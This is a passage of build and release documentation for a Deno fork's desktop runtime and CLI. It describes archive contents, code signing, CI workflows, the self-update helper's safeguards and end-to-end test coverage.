libdenort.dylib | libdenort.so | denort.dll    -> DENORT_DESKTOP_BIN
laufey/                                         -> LAUFEY_DEV_DIR
  webview/build/laufey_webview.app              (macOS, webview)
  webview/build/laufey_webview[.exe]            (Linux / Windows, webview)
  cef/build/Release/laufey.app                  (macOS, cef)
  cef/build/Release/laufey[.exe], libcef.*, ... (Linux / Windows, cef)
  cef/build/Release/dictionaries/*.bdic         (Linux, cef: spellcheck, item 37)
BUILD_INFO.json                                 deno + laufey SHAs, CEF version, run URL
licenses/                                       deno, laufey (and CEF) licenses
```

The `laufey/` paths are the build-tree paths the stock CLI searches under
`LAUFEY_DEV_DIR` (`cli/tools/desktop.rs`, `locate_dev_backend_binary` /
`locate_dev_app_bundle`). On Linux and Windows the CLI copies the whole
directory holding the backend binary into the packaged app, so those directories
hold only the backend's runtime files.

Since `denext.15` each release also has this fork's `deno` CLI (item 26), one
zip per target (every OS): `deno-cli-<version>-<target>.zip`, no wrapping
directory:

```text
deno | deno.exe        the CLI; `Deno.version.deno` is `<version>`
esbuild | esbuild.exe  the official esbuild 0.25.5 `deno bundle` uses
esbuild.LICENSE        esbuild's MIT license
typescript-check/      the native TypeScript 7.0.2 type checking runs (item 47;
                       tsc | tsc.exe, lib.*.d.ts, LICENSE, NOTICE.txt, typescript.json)
tsgolint/              the tsgolint 7.0.2004 `deno lint --type-aware` runs (item 106;
                       tsgolint | tsgolint.exe, LICENSE, tsgolint.json)
BUILD_INFO.json        deno version + SHA, run URL, esbuild, TypeScript and tsgolint sources + SHA-256
licenses/              the deno license
```

Each release also has `SHA256SUMS` (every runtime, CLI and `denort` archive;
`deno compile` checks the `denort` it downloads against it, item 130) and
`manifest.json` (target -> backend -> url, sha256, size; the CLI archives under
`cli.targets` -> target -> binary, url, sha256, size and
`esbuild: { version, sha256 }`,
`typescript_check: { version, sha256, tree_sha256 }` and
`typescript_lsp: { version, sha256, tree_sha256 }` (item 94) and
`tsgolint: { version, sha256, tree_sha256 }` (item 106); plus the deno SHA,
laufey SHA and CEF version). Every archive has a build provenance attestation:

```sh
gh attestation verify deno-desktop-runtime-<...>.tar.gz -R Brainwires/deno
gh attestation verify deno-cli-<...>.zip -R Brainwires/deno
```

The release binaries are signed before they are archived, so the SHA-256 pins
cover the signed bytes (`sign_macos.sh`, `sign_windows.ps1`): on macOS `deno`
and `denort` with the Developer ID of Team `WT957SC7MJ` (hardened runtime,
`cli/entitlements.plist`) and `libdenort.dylib` with the same identity, then
notarized (a bare Mach-O cannot be stapled: Gatekeeper checks the ticket
online); on Windows `deno.exe`, `denort.exe` and `denort.dll` with Authenticode
(SHA-256, RFC 3161 timestamp). Without the signing secrets
(`APPLE_DEVELOPER_ID_CERT`, `APPLE_DEVELOPER_ID_CERT_PASSWORD`, `APPLE_API_KEY`,
`APPLE_API_KEY_ID`, `APPLE_API_ISSUER`; `WINDOWS_CODESIGN_PFX`,
`WINDOWS_CODESIGN_PFX_PASSWORD`) each step warns and the binaries keep an ad-hoc
signature (macOS; arm64 macOS will not load unsigned code) or none (Windows). An
app is still signed with its author's identity when it is packaged.

`*-symbols-<version>-<target>.tar.gz` (with `SYMBOLS.SHA256SUMS`) hold the debug
info the release profile splits off (`.dSYM` / `.dwp` / `.pdb`), for
symbolicating a crash report; they are not in `manifest.json`.

The Linux `deno` and `denort` need glibc 2.27 or newer: the `cli` job links them
against upstream Deno's Ubuntu 18.04 sysroot (`linux_sysroot.sh`) and fails when
one requires a newer `GLIBC_` version than `GLIBC_CEILING`, which is only ever
lowered (item 151); `manifest.json` records it as `cli.glibc`. The Deno Desktop
runtime's `libdenort` and laufey hosts are still built on Ubuntu 22.04 (glibc
2.35), which WebKitGTK 4.1 needs anyway.

## Reproducing a build

The workflow is `.github/workflows/denext_runtime.yml` (helpers in
`.github/denext-runtime/`). Run it from the Actions tab (`workflow_dispatch`,
optional `targets` filter, `laufey_ref` override, and `reuse_*_run_id` to reuse
a previous run's libdenort or laufey build), or push a `denext-runtime-v*` tag
to publish. It also runs on a push to `development-denext` (or a `rel/**`
branch) that changes what the runtime is built from: the `cli`, `runtime`, `ext`
and `libs` crates, the workspace manifests and toolchain (`Cargo.toml`,
`Cargo.lock`, `rust-toolchain.toml`, `.cargo/`), the laufey pin (`LAUFEY_SHA` in
the workflow, `cli/rt_desktop/Cargo.toml`), the workflow and
`.github/denext-runtime/`. A tag publishes only when the setup job's gates pass:
the tag is annotated, points at the commit being built, was never pushed on
another commit and has no release yet (tags and releases are never moved or
replaced: a failed tag build is fixed by the next version); and (`tag_gate.py`)
a full `denext tests` (`denext_tests.yml`) run, every OS leg green (Windows
arm64 included), passed on exactly the tagged commit, no `denext tests` run of
that commit failed in any attempt (a green re-run does not clear a red one) or
is still running, and the commit is on `development-denext` or `rel/<version>`.
A pre-release version (`3.0.0-rc.N`) is published as a GitHub pre-release, never
as the repository's "Latest"; otherwise the release is "Latest" exactly when its
version is the newest. Per target it:

1. builds `libdenort` with `cargo build --release --locked -p denort_desktop`
   after patching `laufey` (`cargo metadata` rewrites laufey's lockfile entry;
   `lock_drift.py` then fails the job if any other package's name, version,
   source, checksum or dependencies moved), with the release profile (fat LTO,
   `codegen-units = 1`), on the runner of that target (Intel macOS on
   `macos-15-intel`, Linux on `ubuntu-22.04` / `ubuntu-22.04-arm` so the glibc
   baseline matches laufey's WebKitGTK 4.1 requirement of Ubuntu 22.04+);
2. builds laufey's webview and CEF hosts with laufey's `make webview` /
   `make cef` (the CEF minimal distribution is downloaded by the Makefile);
3. assembles the archives, checks architectures and dynamic dependencies (`file`
   / `lipo` / `otool -L` / `ldd`, and the import table of every Windows `.exe` /
   `.dll` with `pe_deps.py`; any dependency that resolves nowhere fails it),
   packages a small `Deno.serve` app with the stock `deno desktop` 2.9.8 for
   both backends, and launches it (Linux under Xvfb): the page, served from
   `t3code://app`, POSTs back to `Deno.serve` and the app exits. A launch
   failure fails the job;
4. attests the archives and, on a pushed tag, publishes the release;
5. in a parallel `cli` job, builds this fork's `deno` CLI with
   `cargo build --release --locked --bin deno` and `DENEXT_VERSION` set to the
   release version (`<version>+ci.<run>` for untagged runs), on Linux linked
   against the glibc 2.27 sysroot and checked against `GLIBC_CEILING` (item
   151), fetches and verifies esbuild with `fetch_esbuild.py`, packs both with
   `assemble_cli.sh`, smoke-tests the unpacked archive with `cli_smoke.sh` and
   attests it. The release needs every runtime archive and every CLI archive. A
   dispatch with `cli_only: true` runs just this job and the manifest (no
   laufey, libdenort or package jobs, and never a release): a dry run of the CLI
   archives' layout.

Locally, the equivalent is:

```sh
cargo build --release -p denort_desktop                   # this branch
git clone https://github.com/Brainwires/laufey && cd laufey
git checkout <LAUFEY_SHA> && make webview && make cef
DENORT_DESKTOP_BIN=$PWD/../deno/target/release/libdenort.dylib \
LAUFEY_DEV_DIR=$PWD deno desktop --backend webview main.ts
```

Upstream Deno's own workflows are removed on `development-denext` and the
`denext/*` and `rel/*` branches and disabled in this fork's Actions settings.
Two workflows run instead:

- `denext_runtime.yml` (above): the release build, the launch smoke and the e2e
  suite (see Test coverage). A push to `development-denext` (or a `rel/**`
  branch) that changes the runtime's inputs (above), manual dispatch, or a
  pushed `denext-runtime-v*` tag (which publishes only when a full
  `denext_tests.yml` run passed on the tagged commit).
- `denext_tests.yml` (with the per-OS `denext_tests_os.yml`): upstream Deno's
  own test bar over the fork, the way `v2.9.7`'s `ci.generated.yml` ran it, on
  macOS, Windows and Linux: `tools/lint.js` (workspace clippy with upstream's
  deny flags, dlint, copyright and hygiene checks; the fork's copy knows about
  this file and the removed generated workflows), `tools/format.js --check`,
  `jsdoc_checker.js`, `cargo fmt --check`, `cargo test --locked --lib` over
  upstream's crate list plus the fork's crates, a debug build, and the unit and
  (sharded) spec suites against it; on Linux also upstream's `integration`
  (sharded) and `unit_node` suites; the build and lib tests on macOS x64 and
  Linux arm64; and the build, lib tests and unit suite on Windows arm64
  (`windows-11-arm`). It runs on pushes to `development-denext`, `denext/**`,
  `rel/**`, `ci/**`, `feat/**` and `fix/**`, on pull requests to
  `development-denext`, `denext/**` and `rel/**`, and by manual dispatch. The
  full matrix runs on a push to `development-denext` and on a dispatch (input
  `full`, default true); every other push and pull request runs Linux x64 only
  (lint, cargo audit, and the `ubuntu-22.04` leg: libs, unit, specs,
  integration, unit_node, node_compat), which keeps GitHub's concurrency cap (20
  jobs, 5 macOS) free. For a full run on a branch, dispatch it with
  `-f full=true`
  (`gh workflow run denext_tests.yml --ref <branch> -f full=true`); for one more
  OS on a Linux run, `-f full=false -f macos=true` (or `windows=true`). A newer
  push cancels the run before it on the same ref; dispatched and tag runs are
  never cancelled.

## The update helper

The full-app updater's helper is the app's own executable started from argv
(`<exe> run denext-update-helper <mode> <pid>`), so anyone can start it, with a
state file next to the install that anything running as the user can write. It
is safe to start because it takes no paths and runs no code but the app's own:
the install, `.old`, the staging directory and the state, log and lock files all
derive from the executable's own location; the staged app is a single plain name
inside the staging directory; only paths proven to be copies of this app's
install (the packager's marker) are swapped or deleted; the relaunch starts the
install's executable. What a forged state could still ask for, a swap of some
other app tree placed in the staging directory, is checked again right before
the swap as `stage()` checked it: the OS code signature against the running
app's signer, the staged app's own version equal to the state's and newer than
the installed one, and not a rejected version. So it can't be used to put an app
the updater would refuse in place of a signed one.

## Development switches

`deno desktop --hmr` / `--inspect*` launch a throwaway build with
`DENO_DESKTOP_HMR`, `DENO_DESKTOP_DEV_URL`, `DENO_DESKTOP_FRAMEWORK_DEV`,
`DENO_DESKTOP_INSPECT_INTERNAL_PORT` / `_BRK` / `_WAIT` and
`DENO_DESKTOP_MUX_WS` in its environment. The runtime honours them only in a
binary whose compiled metadata says it is a development build
(`desktop_dev: true`, written only by this fork's CLI on that path); any other
binary, a packaged app included, ignores them with a note on stderr. A stock CLI
never writes the mark, so its own `--hmr` run against this runtime runs without
hot reload.

## Test coverage

Specs this fork adds for what its runtime exposes outside a desktop app:

- `tests/specs/run/desktop_ops_inert`: every `Deno.desktop` op and native class
  in `NOT_IMPORTED_OPS` (reachable from any code through
  `Deno[Deno.internal].core.ops`) called in a plain `deno run` with no
  permissions: each answers "not supported", an empty value or a refusal, opens
  nothing, writes nothing, and the classes throw `NotSupported`;
  `runOnMainThread`'s op needs `--allow-ffi` first. The spec fails on an exposed
  op it has no case for, and a Rust test fails when `NOT_IMPORTED_OPS` names a
  desktop op the spec lacks.
- `tests/specs/serve/memory_address`: `DENO_SERVE_ADDRESS=memory:<name>` serves
  on the in-process memory transport (no socket, no net permission), and a TCP
  server refuses a request target that claims `http+memory://` (400).
- `tests/specs/check/desktop_types`: the fork's `Deno.desktop` types check with
  `--desktop`, and misuses are type errors.
- `tests/specs/sql`: `Deno.SQL` over SQLite (helpers, parameters that would
  break interpolation, transactions and savepoints, errors, permissions,
  read-only files, result column metadata and the type round-trip matrix) and
  Postgres client failures against stand-in servers (`sslmode=require` refused
  by a server without TLS, connect timeout, refused port, net and env
  permissions). The `pg_*` tests that need a real server (types both ways,
  column metadata and the type round-trip matrix, SQLSTATE errors, transactions,
  the pool's limits and timeouts, TLS modes) run when
  `DENO_SQL_TEST_POSTGRES_URL` (and, for TLS, `DENO_SQL_TEST_POSTGRES_CA`) is
  set, and are skipped otherwise.
- `tests/specs/bundle/define`: `deno bundle --define` replaces identifiers and
  member expressions, drops the dead branch under `--minify`, and rejects bad
  names and values (item 78).
- `tests/specs/npm/supply_chain_*`: the npm supply-chain gates (items 83-86)
  against stand-ins for OSV and npm's downloads API
  (`tests/util/server/servers/supply_chain.rs`, port 4270); the jail's probe
  package tries the ways out of a confined lifecycle script on each OS.
- `tests/specs/run/desktop_ops_inert` (`sys.js`): the integrations that need
  `--allow-sys` refuse without it (and with only some sys names) and are inert
  with it.

Upstream Deno has no end-to-end harness for `deno desktop` apps (its own tests
stop at unit tests and `tests/specs` of the CLI), so this fork carries its own,
the equivalent of laufey's `native_e2e`: `.github/denext-runtime/e2e/`. The
runtime workflow runs it after the launch smoke on every target with both
backends (Linux under Xvfb with the xfwm4 window manager, a private D-Bus
session and a stand-in notification server, `linux/`).

Layout:

| Path                  | What                                                                                                                                                                                                          |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `e2e.sh`              | Unpacks the archive under test, sets up the Linux session, runs `run.ts` with the stock `deno` (2.9.8).                                                                                                       |
| `run.ts`              | Runs every area (`E2E_AREAS` / the workflow's `e2e_areas` input narrows it), writes `e2e-<target>-<backend>.json` and the step summary, exits 1 on any failure.                                               |
| `lib/runner.ts`       | Packages an app with the stock `deno desktop` against `DENORT_DESKTOP_BIN` / `LAUFEY_DEV_DIR`, writes `.deno-desktop/app.json` and `laufey-launch.json` as denext's packager does, launches, collects, kills. |
| `apps/<area>/main.ts` | One small app per area; `apps/_shared` has the reporting (`e2e.ts`) and real input (`input.ts`: XTEST / `keybd_event` / CoreGraphics key presses, the window manager's close).                                |
| `areas/<area>.ts`     | The runner side of each area: launches the OS would make, and checks only the outside can make (state across launches, the registry / XDG / LaunchServices, processes that must not start).                   |

Each check is `pass`, `fail` or `n/a`; an `n/a` carries the reason and is listed
in the job summary, never skipped silently. Areas:

- **origin** — page origin and secure context, `request.url` / `remoteAddr` of
  the memory transport, incremental streaming, `Origin` on a cross-origin fetch,
  the page's WebSocket through the relay, a response the page aborts cancelled
  in the app, a stream the page stops reading held back; the relay refusing
  foreign / missing / duplicate / upper-cased origins and a missing or wrong
  relay token (403) and plain HTTP (400) and admitting the exact origin with the
  token (101); the cross-origin marker on an opaque frame's POST; bindings
  refusing a page at another origin unless opted in; a TCP `Deno.serve` refusing
  `http+memory:` request targets (400); the env overlay reaching a child process
  (also through `node:child_process`), without the in-process
  `DENO_SERVE_ADDRESS` or the relay URL; a forked module the app ships answering
  over IPC, a script outside the app refused, and `<App> run x.js` from outside
  exiting without running it; and a second app whose server is `node:http`
  (`originnode`): the page, a POST round trip and the memory socket's
  `remoteAddress`.
- **appid** — localStorage and IndexedDB persisting across launches of one
  identifier and not visible to another identifier at the same origin.
- **deeplink** — cold argv links and files, second-instance forwarding (no
  second runtime), startup registration (HKCU, XDG in a throwaway
  `XDG_DATA_HOME`/`XDG_CONFIG_HOME`, LaunchServices), OS-routed links cold and
  warm (`Start-Process`, `xdg-open`, `open`), `open -a <app> <file>` on macOS,
  another owner left alone until `force`; on Windows the stock CLI's `.msi`
  installed with `msiexec`, registering from Program Files and receiving links
  cold and warm, then uninstalled.
- **window** — the window API, state events, limits, placement, chrome vs
  `windowCapabilities()`, a user close canceled and a close the runtime never
  answers, `quit()`, the tray rule, `initialWindow` from `app.json`; a frameless
  panel created first is a new window and the next plain one adopts the initial
  window; a string with a NUL is a `TypeError` (`setTitle`, `navigate`,
  `clipboard.writeText`); workers have no native classes.
- **dnd** — the clipboard in every format and its change event, file dialogs
  opened and aborted (open / save, modal / app-level), busy and argument
  refusals, `startDrag` refusals.
- **passkeys** — argument refusals, every refusal envelope, one ceremony at a
  time, the slot freed after an OS refusal, no passkeys in workers.
- **sld** — global shortcuts with a real key press, launch at login against the
  OS's record (autostart entry, `HKCU\...\Run`), DevTools on (env override) and
  off (`"inspectable": false`).
- **menus** — application-menu accelerators from the keyboard, context menus
  dismissed and chosen from the keyboard; notifications shown, clicked, acted on
  and dismissed (Linux: the stand-in server; Windows: the app's toast activator,
  `windows/toast-click.ps1`), scheduled / listed / cancelled, a scheduled one's
  click as `notificationresponse`, and on Windows the cold-start click (COM
  starts the app).
- **asmt** — `runOnMainThread` proven on the UI thread (the thread that owns the
  windows, by the OS's own thread id) and not the JavaScript thread, context /
  return values, `UnsafeFnPointer` / `UnsafeCallback`, 50 calls at once,
  argument refusals, `--allow-ffi`; `authSession`: argument refusals, on macOS a
  real ephemeral `ASWebAuthenticationSession` against a loopback identity
  provider ending at the callback, `busy`, and the anchor window closing
  (`cancelled`), the app's `cancel()` (`cancelled` once, then `false`, and the
  next session completes); `cancel()` with nothing running is `false` on every
  OS; `not_supported` on Windows and Linux; neither in workers.
- **update** — full-app self-update with throwaway keys and a throwaway TLS CA:
  hostile manifests and archives refused with their codes and the install
  untouched (including a replayed `sequence`, a missing `sequence` or
  `expiresAt`, an expired `expiresAt`, and another version's archive under a
  manifest's version), the accepted sequence recorded, an unwritable install,
  1.0.0 -> 2.0.0 relaunch and confirm, a 3.0.0 trial that never confirms rolled
  back and refused (and kept in the rejected set).
- **Node-API** stays in `launch.sh`.

What a hosted runner cannot do, reported `n/a` with the reason:

| Check                                               | Why                                                                                                                    |
| --------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| A real file drop / completed drag-out               | needs an OS drag session driven by a pointer                                                                           |
| A completed passkey ceremony                        | needs a person (Touch ID / Windows Hello) and, on macOS, an associated-domains entitlement in a Developer ID signature |
| A staged update accepted by signer match            | needs a real Developer ID / Authenticode identity                                                                      |
| Notification clicks and dismissals on macOS         | only a person clicking a banner produces one for an unsigned app                                                       |
| A notification click on Linux after the app exited  | freedesktop servers send the click to the posting process only (`coldStart: false`)                                    |
| A dismissed toast on Windows, a live toast's click  | the hosted session retires toasts within ~2 s; the click is then checked as a `notificationresponse`                   |
| Key presses on macOS without an Accessibility grant | macOS refuses synthesized events (checked with `AXIsProcessTrusted`)                                                   |
| A real OS auth session on Windows / Linux           | they have no OS auth session (`not_supported` is checked)                                                              |
| `.msi` on macOS / Linux                             | the stock CLI builds `.msi` only for Windows                                                                           |
| An unwritable install on Windows                    | the runner is an administrator                                                                                         |

The suite's first full run found four failures in laufey's hosts (not in this
fork's runtime), all fixed in laufey `denext/integration` (now
`development-denext`) at API 43 and now checked on every leg:

- origin, CEF on every OS: the page's WebSocket through the relay and a
  cross-origin fetch to loopback were held by Chromium's Local Network Access
  checks (a custom-scheme page is a "public" origin). The CEF hosts grant
  local-network access to the app's own registered custom-scheme origins only;
  the checks stay on for everything else.
- menus, CEF on Windows: the runtime's event loop stopped while
  `TrackPopupMenu`'s modal loop ran on CEF's UI thread (task starvation).
- menus, WebView2: keyboard selection in a context menu (the owner window is
  made foreground first, KB135788).
- dnd, Windows: an aborted file dialog did not always close, so its promise
  never settled.
